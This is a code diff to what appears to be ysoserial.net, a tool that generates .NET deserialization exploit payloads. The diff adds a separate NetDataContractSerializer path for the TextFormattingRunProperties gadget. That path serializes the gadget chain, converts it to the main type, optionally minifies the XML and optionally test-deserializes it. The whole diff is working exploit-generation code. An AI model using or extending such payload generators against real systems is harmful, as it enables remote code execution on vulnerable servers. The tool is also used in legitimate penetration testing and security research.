@@ -139,13 +139,49 @@ namespace ysoserial.Generators
                 inputArgs.ExtraInternalArguments = new List<String> { "--variant", "3", "--xamlurl", xaml_url};
             }
 
+            //SerializersHelper.ShowAll(TextFormattingRunPropertiesGadget(inputArgs));
+
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
+                || formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
             {
                 return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
+            }
+            else if (formatter.Equals("NetDataContractSerializer", StringComparison.OrdinalIgnoreCase))
+            {
+                InputArgs tempInputArgs = inputArgs.DeepCopy();
+                tempInputArgs.Test = false;
+                string utfString = System.Text.Encoding.UTF8.GetString((byte [])Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, tempInputArgs));
+
+                string payload = SerializersHelper.NetDataContractSerializer_Marshal_2_MainType(utfString);
+
+                if (inputArgs.Minify)
+                {
+                    if (inputArgs.UseSimpleType)
+                    {
+                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib", "Microsoft.PowerShell.Editor" }, null, FormatterType.NetDataContractXML, true);
+                    }
+                    else
+                    {
+                        payload = XMLMinifier.Minify(payload, null, null, FormatterType.NetDataContractXML, true);
+                    }
+                }
+
+                if (inputArgs.Test)
+                {
+                    try
+                    {
+                        SerializersHelper.NetDataContractSerializer_deserialize(payload);
+                    }
+                    catch (Exception err)
+                    {
+                        Debugging.ShowErrors(inputArgs, err);
+                    }
+
+                }
+
+                return payload;
             }
             else if (formatter.ToLower().Equals("DataContractSerializer", StringComparison.OrdinalIgnoreCase))
             {
